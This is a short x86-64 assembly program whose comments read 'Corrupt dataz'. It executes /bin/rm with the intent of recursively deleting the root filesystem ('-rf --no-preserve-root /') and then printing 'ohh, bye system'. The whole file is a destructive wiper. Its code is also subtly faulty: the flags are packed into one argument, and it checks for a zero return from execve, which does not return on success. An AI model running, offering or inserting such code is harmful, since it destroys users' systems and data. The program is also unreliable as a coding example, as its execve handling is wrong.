section .data
    ; Variables
    cmd:                 DB  "/bin/rm", 0
    arg:                 DB  "-rf --no-preserve-root", 0
    dir:                 DB  "/", 0
    args:                DQ  cmd, arg, dir, 0
    message:             DB  "ohh, bye system", 10
    message_len:         equ $-message 
    error:               DB "Error occured", 10
    error_len:           equ $-error

section .text
    global _start

_start:
    ; Corrupt dataz
    mov rax, 59               ; system call 59: exec
    mov rdi, cmd              ; command name
    mov rsi, args             ; arguments
    mov rdx, 0
    syscall                   ; call into the system

    test rax, rax             ; Check if rax is zero (success)
    jz success

    ; Print confirmation
    mov rax, 1                ; sys call 1: write
    mov rdi, 1                ; file handle 1: stdout
    mov rsi, error            ; message address
    mov rdx, error_len        ; message length
    syscall                   ; call the kernel

    ; Exit program
    mov rax, 60               ; system call 60: exit
    mov rdi, 1                ; return code
    syscall                   ; call the kernel

success:
    ; Print confirmation
    mov rax, 1                ; sys call 1: write
    mov rdi, 1                ; file handle 1: stdout
    mov rsi, message          ; message address
    mov rdx, message_len      ; message length
    syscall

    ; Exit program
    mov rax, 60               ; system call 60: exit
    mov rdi, 0                ; return code
    syscall 
